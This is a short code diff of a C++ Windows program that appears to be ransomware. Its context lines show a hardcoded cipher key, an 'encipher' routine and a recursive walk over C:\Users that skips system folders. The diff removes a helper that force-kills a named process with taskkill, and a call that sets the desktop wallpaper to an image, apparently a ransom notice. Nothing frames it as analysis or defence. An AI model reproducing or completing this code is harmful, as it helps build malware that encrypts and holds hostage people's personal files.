@@ -14,14 +14,6 @@
 #define BLOCK_SIZE 8
 
 
-void backGroundApp()
-{
-	HWND hWnd = FindWindow(NULL, L"wallpaperservice32_c.exe");
-	if (hWnd != 0)
-	{
-		system("taskkill /F /T /IM wallpaperservice32_c.exe");
-	}
-}
 
 unsigned int key[4] = { 0xFACE, 0xDEAD, 0xBABE, 0xD00D };
 
@@ -42,9 +34,7 @@ void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4])
 
 int main()
 {
-	backGroundApp();
-	LPWSTR test = (LPWSTR)"Tu.png";
-	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, test, SPIF_UPDATEINIFILE);
+
 	std::set<std::string> ignoredirs = { "system32","Program Files","Program Files (x86)","$Recycle.Bin","Windows","AppData","ProgramData"};
 	std::string path = "C:\\Users";
 	for (std::filesystem::recursive_directory_iterator entry(path),end; entry != end; ++entry)
